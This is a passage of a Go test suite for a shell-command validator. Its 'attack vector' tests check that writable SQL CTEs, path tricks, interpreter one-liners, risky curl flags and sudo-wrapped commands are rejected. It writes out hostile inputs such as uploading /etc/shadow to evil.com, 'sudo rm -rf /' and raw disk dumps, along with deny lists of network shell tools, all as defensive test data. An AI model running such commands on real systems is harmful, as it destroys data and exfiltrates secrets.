		sql := "WITH cte AS (SELECT 'it''s a test') SELECT * FROM cte"
		err := validateOne(t, "psql", "-c", sql)
		expectAllow(t, err, "CTE with escaped quotes should be allowed")
	})

	// Writable CTE: DELETE inside CTE definition with SELECT terminal
	t.Run("cte_with_delete_inside_definition", func(t *testing.T) {
		sql := "WITH deleted AS (DELETE FROM users RETURNING *) SELECT * FROM deleted"
		err := validateOne(t, "psql", "-c", sql)
		expectReject(t, err, "writable CTE with DELETE inside definition must be rejected")
	})

	// Writable CTE: INSERT inside CTE definition with SELECT terminal
	t.Run("cte_with_insert_inside_definition", func(t *testing.T) {
		sql := "WITH inserted AS (INSERT INTO evil VALUES (1) RETURNING *) SELECT * FROM inserted"
		err := validateOne(t, "psql", "-c", sql)
		expectReject(t, err, "writable CTE with INSERT inside definition must be rejected")
	})

	// Writable CTE: UPDATE inside CTE definition with SELECT terminal
	t.Run("cte_with_update_inside_definition", func(t *testing.T) {
		sql := "WITH updated AS (UPDATE users SET admin=true RETURNING *) SELECT * FROM updated"
		err := validateOne(t, "psql", "-c", sql)
		expectReject(t, err, "writable CTE with UPDATE inside definition must be rejected")
	})

	// CTE without parentheses (malformed)
	t.Run("cte_no_parens", func(t *testing.T) {
		sql := "WITH DELETE FROM users"
		err := validateOne(t, "psql", "-c", sql)
		expectReject(t, err, "malformed CTE without parentheses")
	})

	// Terminal statement with leading comma (from CTE list separator)
	t.Run("cte_terminal_with_leading_comma", func(t *testing.T) {
		sql := "WITH a AS (SELECT 1), b AS (SELECT 2) SELECT * FROM a, b"
		err := validateOne(t, "psql", "-c", sql)
		// The remainder after last ) is " SELECT * FROM a, b"
		// TrimLeft removes ", \t\n\r" then checks for SELECT prefix
		expectAllow(t, err, "CTE with multiple definitions should be allowed")
	})
}

// ATTACK VECTOR 9: Glob validation gaps
//
// The glob checker rejects positional args containing *, ?, [
// But some arguments legitimately contain these characters.

func TestGlobValidationGaps(t *testing.T) {
	// Positional arg with * should be rejected
	t.Run("positional_glob_star", func(t *testing.T) {
		err := validateOne(t, "grep", "error", "*.log")
		expectReject(t, err, "positional * should be rejected")
	})

	// Positional arg with ? should be rejected
	t.Run("positional_glob_question", func(t *testing.T) {
		err := validateOne(t, "grep", "error", "file?.log")
		expectReject(t, err, "positional ? should be rejected")
	})

	// Positional arg with [ should be rejected
	t.Run("positional_glob_bracket", func(t *testing.T) {
		err := validateOne(t, "grep", "error", "[abc].log")
		expectReject(t, err, "positional [ should be rejected")
	})

	// grep regex pattern (position 0) should be exempt
	t.Run("grep_regex_pattern_exempt", func(t *testing.T) {
		err := validateOne(t, "grep", "error.*fatal", "/var/log/syslog")
		expectAllow(t, err, "grep pattern at regex_arg_position should be exempt from glob check")
	})

	// rg regex pattern (position 0) should be exempt
	t.Run("rg_regex_pattern_exempt", func(t *testing.T) {
		err := validateOne(t, "rg", "error[0-9]+", "/var/log/")
		expectAllow(t, err, "rg pattern at regex_arg_position should be exempt from glob check")
	})

	// find -name takes pattern_value — glob in flag value should be allowed
	t.Run("find_name_pattern_allowed", func(t *testing.T) {
		err := validateOne(t, "find", "/tmp", "-name", "*.log")
		expectAllow(t, err, "find -name *.log should be allowed (pattern_value flag)")
	})

	// Glob chars in a flag value that doesn't have pattern_value
	t.Run("glob_in_non_pattern_flag_value", func(t *testing.T) {
		err := validateOne(t, "grep", "-C", "3", "error", "/var/log/*.txt")
		// The /var/log/*.txt is a positional arg (index 1 after -C 3 consumed, plus pattern at 0)
		// Position 0 = "error" (exempt), position 1 = "/var/log/*.txt" (not exempt)
		expectReject(t, err, "glob in non-exempt positional arg should be rejected")
	})

}

// ATTACK VECTOR 10: Command aliasing/path tricks
//
// The validator checks the command name against the registry.
// If a command is invoked with a full path, the parser preserves it.
// The registry uses bare names like "ls", "find", etc.

func TestCommandAliasingAndPaths(t *testing.T) {
	// Full path to a command: /bin/ls
	// The parser preserves this as the command name, but the registry has "ls"
	t.Run("full_path_ls", func(t *testing.T) {
		err := validateOne(t, "/bin/ls", "/tmp")
		// Registry key is "ls", not "/bin/ls"
		expectReject(t, err, "/bin/ls should not match registry entry 'ls'")
	})

	// Full path to bash
	t.Run("full_path_bash", func(t *testing.T) {
		err := validateOne(t, "/bin/bash")
		// "/bin/bash" doesn't match "bash" in the registry
		expectReject(t, err, "/bin/bash should not match — unknown command")
	})

	// Full path to rm
	t.Run("full_path_rm", func(t *testing.T) {
		err := validateOne(t, "/bin/rm", "/tmp/file")
		expectReject(t, err, "/bin/rm should not match registry entry 'rm'")
	})

	// Relative path
	t.Run("relative_path", func(t *testing.T) {
		err := validateOne(t, "./evil")
		expectReject(t, err, "./evil is not in the registry")
	})

	// Parent directory path
	t.Run("parent_dir_path", func(t *testing.T) {
		err := validateOne(t, "../bin/evil")
		expectReject(t, err, "../bin/evil is not in the registry")
	})

	// busybox applets: busybox itself isn't in the registry
	t.Run("busybox_applet", func(t *testing.T) {
		err := validateOne(t, "busybox", "sh")
		expectReject(t, err, "busybox is not in the registry")
	})

	// env command to run other commands (denied)
	t.Run("env_command", func(t *testing.T) {
		err := validateOne(t, "env", "bash")
		expectReject(t, err, "env is denied")
	})

	// nice to wrap commands (denied)
	t.Run("nice_command", func(t *testing.T) {
		err := validateOne(t, "nice", "bash")
		expectReject(t, err, "nice is denied")
	})

	// nohup (denied)
	t.Run("nohup_command", func(t *testing.T) {
		err := validateOne(t, "nohup", "bash")
		expectReject(t, err, "nohup is denied")
	})

	// timeout (denied)
	t.Run("timeout_command", func(t *testing.T) {
		err := validateOne(t, "timeout", "10", "bash")
		expectReject(t, err, "timeout is denied")
	})

	// strace (denied)
	t.Run("strace_command", func(t *testing.T) {
		err := validateOne(t, "strace", "-p", "1")
		expectReject(t, err, "strace is denied")
	})

	// eval (denied)
	t.Run("eval_command", func(t *testing.T) {
		err := validateOne(t, "eval", "ls")
		expectReject(t, err, "eval is denied")
	})

	// source (denied)
	t.Run("source_command", func(t *testing.T) {
		err := validateOne(t, "source", "/tmp/evil.sh")
		expectReject(t, err, "source is denied")
	})

	// perl (denied)
	t.Run("perl_command", func(t *testing.T) {
		err := validateOne(t, "perl", "-e", "system('id')")
		expectReject(t, err, "perl is denied")
	})

	// python (denied)
	t.Run("python_command", func(t *testing.T) {
		err := validateOne(t, "python", "-c", "import os; os.system('id')")
		expectReject(t, err, "python is denied")
	})

	// python3 (denied)
	t.Run("python3_command", func(t *testing.T) {
		err := validateOne(t, "python3", "-c", "import os; os.system('id')")
		expectReject(t, err, "python3 is denied")
	})

	// node (denied)
	t.Run("node_command", func(t *testing.T) {
		err := validateOne(t, "node", "-e", "require('child_process').execSync('id')")
		expectReject(t, err, "node is denied")
	})

	// ruby (denied)
	t.Run("ruby_command", func(t *testing.T) {
		err := validateOne(t, "ruby", "-e", "system('id')")
		expectReject(t, err, "ruby is denied")
	})

	// lua (denied)
	t.Run("lua_command", func(t *testing.T) {
		err := validateOne(t, "lua", "-e", "os.execute('id')")
		expectReject(t, err, "lua is denied")
	})

	// php (denied)
	t.Run("php_command", func(t *testing.T) {
		err := validateOne(t, "php", "-r", "system('id');")
		expectReject(t, err, "php is denied")
	})
}

// ADDITIONAL ATTACK VECTORS

// ATTACK VECTOR 11: psql -f flag bypass
// psql -f executes SQL from a file — the contents cannot be inspected.
func TestPsqlFileFlagDenied(t *testing.T) {
	// -f is explicitly denied in the psql manifest
	t.Run("psql_dash_f", func(t *testing.T) {
		err := validateOne(t, "psql", "-c", "SELECT 1", "-f", "evil.sql")
		expectReject(t, err, "psql -f executes SQL from file without inspection")
	})
}

// ATTACK VECTOR 12: curl method bypass
// curl -X is denied but what about long forms?
func TestCurlMethodBypass(t *testing.T) {
	t.Run("curl_X_denied", func(t *testing.T) {
		err := validateOne(t, "curl", "-X", "POST", "http://evil.com")
		expectReject(t, err, "curl -X is denied")
	})

	t.Run("curl_request_denied", func(t *testing.T) {
		err := validateOne(t, "curl", "--request", "DELETE", "http://evil.com/resource")
		expectReject(t, err, "curl --request is denied")
	})

	t.Run("curl_data_denied", func(t *testing.T) {
		err := validateOne(t, "curl", "-d", "evil=data", "http://evil.com")
		expectReject(t, err, "curl -d is denied")
	})

	t.Run("curl_data_long_denied", func(t *testing.T) {
		err := validateOne(t, "curl", "--data", "evil=data", "http://evil.com")
		expectReject(t, err, "curl --data is denied")
	})

	t.Run("curl_upload_file_denied", func(t *testing.T) {
		err := validateOne(t, "curl", "-T", "/etc/shadow", "http://evil.com")
		expectReject(t, err, "curl -T upload is denied")
	})

	t.Run("curl_output_inline_denied", func(t *testing.T) {
		err := validateOne(t, "curl", "--output=/tmp/evil", "http://example.com")
		expectReject(t, err, "curl --output= inline is denied")
	})

	t.Run("curl_remote_name_denied", func(t *testing.T) {
		err := validateOne(t, "curl", "-O", "http://evil.com/malware")
		expectReject(t, err, "curl -O downloads to file")
	})
}

// ATTACK VECTOR 13: Subcommand with flags before subcommand
// In real docker/kubectl, global flags come before the subcommand.
// E.g., `docker --debug exec container bash`
// The validator takes args[0] as the subcommand unconditionally.
func TestSubcommandFlagOrdering(t *testing.T) {
	// docker --debug exec: the validator treats "--debug" as the subcommand
	t.Run("docker_global_flag_before_subcommand", func(t *testing.T) {
		err := validateOne(t, "docker", "--debug", "exec", "container", "bash")
		// "--debug" is treated as subcommand → "docker_--debug" not found → rejected
		// This is SAFE but the error message is wrong
		expectReject(t, err, "docker --debug should not be a valid subcommand")
	})

	// kubectl --namespace=default get pods
	t.Run("kubectl_namespace_before_subcommand", func(t *testing.T) {
		err := validateOne(t, "kubectl", "--namespace=default", "get", "pods")
		// "--namespace=default" treated as subcommand → rejected
		// In real kubectl, --namespace is a global flag before the subcommand
		// This means valid global-flag usage is blocked
		expectReject(t, err, "kubectl --namespace= before subcommand treated as subcommand name")
	})
}

// ATTACK VECTOR 14: Exhaustive denied command coverage
// Verify that ALL shell/scripting commands in the denied list are actually rejected.
func TestDeniedCommandsCoverage(t *testing.T) {
	deniedShells := []string{
		"sh", "bash", "zsh", "ksh", "csh", "tcsh", "fish", "dash",
	}
	deniedEditors := []string{
		"vim", "vi", "nvim", "nano", "emacs", "ed", "ex", "pico",
	}
	deniedDestructive := []string{
		"rm", "mv", "cp", "chmod", "chown", "chgrp", "mkdir", "mkfifo", "mknod",
		"ln", "truncate", "shred", "touch", "install", "dd",
	}
	deniedScripting := []string{
		"python", "python3", "perl", "ruby", "node", "lua", "php",
		"awk", "gawk", "nawk", "sed",
	}
	deniedSysAdmin := []string{
		"reboot", "shutdown", "halt", "poweroff", "init",
		"mount", "kill", "killall", "pkill",
		"useradd", "userdel", "usermod", "groupadd", "groupdel",
		"passwd", "su",
	}
	deniedNetwork := []string{
		"nc", "ncat", "socat", "telnet", "scp", "sftp", "wget",
		"ip", "iptables", "nft",
	}
	deniedOther := []string{
		"eval", "source", "env", "nohup", "nice", "timeout",
		"screen", "tmux", "script", "expect", "batch", "at",
		"crontab", "strace", "ltrace", "tee",
		"rsync", "apt", "yum", "pip",
		"gzip", "gunzip", "bzip2", "xz", "zstd", "zip",
	}

	allDenied := make([]string, 0)
	allDenied = append(allDenied, deniedShells...)
	allDenied = append(allDenied, deniedEditors...)
	allDenied = append(allDenied, deniedDestructive...)
	allDenied = append(allDenied, deniedScripting...)
	allDenied = append(allDenied, deniedSysAdmin...)
	allDenied = append(allDenied, deniedNetwork...)
	allDenied = append(allDenied, deniedOther...)

	for _, cmd := range allDenied {
		t.Run("denied_"+cmd, func(t *testing.T) {
			err := validateOne(t, cmd)
			expectReject(t, err, cmd+" should be denied")
		})
	}
}

// ATTACK VECTOR 15: Sudo wrapping a denied command with all its forms
func TestSudoWithDeniedCommands(t *testing.T) {
	dangerousCmds := []struct {
		name string
		cmd  string
		args []string
	}{
		{"sudo_rm", "rm", []string{"-rf", "/"}},
		{"sudo_bash", "bash", nil},
		{"sudo_sh", "sh", nil},
		{"sudo_python", "python", []string{"-c", "import os; os.system('id')"}},
		{"sudo_chmod", "chmod", []string{"777", "/etc/shadow"}},
		{"sudo_chown", "chown", []string{"root:root", "/tmp/evil"}},
		{"sudo_dd", "dd", []string{"if=/dev/sda", "of=/tmp/disk.img"}},
		{"sudo_vim", "vim", []string{"/etc/shadow"}},
	}

	for _, tc := range dangerousCmds {
		t.Run(tc.name, func(t *testing.T) {
			sudoArgs := append([]string{tc.cmd}, tc.args...)
			err := validateOne(t, "sudo", sudoArgs...)
			expectReject(t, err, "sudo "+tc.cmd+" should be rejected")
		})

		// Also test with sudo -u root
		t.Run(tc.name+"_with_u_root", func(t *testing.T) {
			sudoArgs := append([]string{"-u", "root", tc.cmd}, tc.args...)
			err := validateOne(t, "sudo", sudoArgs...)
			expectReject(t, err, "sudo -u root "+tc.cmd+" should be rejected")
		})
	}
}

// ATTACK VECTOR 16: Long flag variants that might not be in manifests
func TestLongFlagVariants(t *testing.T) {
	// tail --follow is the long form of -f and is explicitly denied
	t.Run("tail_follow_long_form", func(t *testing.T) {
		err := validateOne(t, "tail", "--follow", "/var/log/syslog")
		expectReject(t, err, "tail --follow is explicitly denied")
	})

	// journalctl --follow is the long form of -f and is explicitly denied
	t.Run("journalctl_follow_long_form", func(t *testing.T) {
		err := validateOne(t, "journalctl", "--follow")
		expectReject(t, err, "journalctl --follow is explicitly denied")
	})

	// Unknown long flags should be rejected
	t.Run("ls_unknown_long_flag", func(t *testing.T) {
		err := validateOne(t, "ls", "--color=auto", "/tmp")
		// --color is not in the ls manifest
		expectReject(t, err, "ls --color is not in the manifest")
	})

	t.Run("grep_unknown_long_flag", func(t *testing.T) {
		err := validateOne(t, "grep", "--color=always", "error", "/var/log/syslog")
		expectReject(t, err, "grep --color is not in the manifest")
	})
}

// ATTACK VECTOR 17: psql --command= validation
// The -c flag validation is triggered by the flag name "-c".
// Does --command= also trigger SQL validation?
func TestPsqlLongFormSQLValidation(t *testing.T) {
	// --command= satisfies the "requires -c" check (validatePsqlRequiresC).
	// But does validateFlagValue get called for the SQL content?
	// Looking at the code: splitLongFlag handles --command=SELECT 1,
	// but the flag object is looked up as "--command" which is NOT in
	// the psql manifest (only "-c" is).
	t.Run("psql_command_equals_dangerous_sql", func(t *testing.T) {
		err := validateOne(t, "psql", "--command=DELETE FROM users")
		// --command is not in the manifest, so it's rejected as an
		// unrecognized flag (not because the SQL is dangerous). This is
		// safe but the rejection reason is incidental, not deliberate.
		if err == nil {
			t.Fatal("BYPASS: psql --command=DELETE FROM users was allowed")
		}
		// Assert the rejection reason is what we expect: unrecognized flag.
		if !strings.Contains(err.Error(), "not recognized") && !strings.Contains(err.Error(), "command") {
			t.Errorf("unexpected rejection reason for psql --command=: %v", err)
		}
	})
}

// ATTACK VECTOR 18: Numeric shorthand edge cases
func TestNumericShorthandEdgeCases(t *testing.T) {
	// head -20 should be allowed (numeric count shorthand)
	t.Run("head_numeric", func(t *testing.T) {
		err := validateOne(t, "head", "-20", "/var/log/syslog")
		expectAllow(t, err, "head -20 is a numeric count shorthand")
	})

	// head -n has takes_value, so -20 is treated as shorthand for -n 20
	// But what about a command without -n? e.g., ls -20
	t.Run("ls_numeric_no_n_flag", func(t *testing.T) {
		// ls doesn't have a -n flag with takes_value
		err := validateOne(t, "ls", "-20", "/tmp")
		// isNumericCountShorthand checks for -n flag with takes_value
		// ls has no -n flag, so this should fail
		expectReject(t, err, "ls -20 should be rejected (ls has no -n flag)")
	})
}

// ATTACK VECTOR 19: Edge cases in combined flag processing with takes_value
func TestCombinedFlagWithValueEdgeCases(t *testing.T) {
	// grep -C5 — -C takes_value, "5" is inline value
	t.Run("grep_C5_combined", func(t *testing.T) {
		err := validateOne(t, "grep", "-C5", "error", "/var/log/syslog")
		expectAllow(t, err, "grep -C5 should be allowed (inline value for -C)")
	})

	// grep -iC5n — -i (no value), -C (takes value → "5n" is the value)
	t.Run("grep_iC5n_combined", func(t *testing.T) {
		err := validateOne(t, "grep", "-iC5n", "error", "/var/log/syslog")
		// -i is allowed, -C takes_value → rest "5n" is the value for -C
		// The value "5n" for -C is technically invalid but the validator
		// doesn't check numeric validity for -C values.
		expectAllow(t, err, "grep -iC5n — -C consumes rest as value")
	})
}

// ATTACK VECTOR 20: Empty and edge case inputs
func TestEdgeCaseInputs(t *testing.T) {
	// Command with no args
	t.Run("ls_no_args", func(t *testing.T) {
		err := validateOne(t, "ls")
		expectAllow(t, err, "ls with no args should be allowed")
	})

	// Bare dash as argument
	t.Run("cat_bare_dash", func(t *testing.T) {
		// "-" means stdin; treated as a positional arg
		err := validateOne(t, "cat", "-")
		expectAllow(t, err, "cat - (stdin) should be allowed")
	})

	// Very long argument
	t.Run("echo_very_long_arg", func(t *testing.T) {
		longArg := strings.Repeat("A", 10000)
		err := validateOne(t, "echo", longArg)
		expectAllow(t, err, "echo with long arg should be allowed")
	})

}
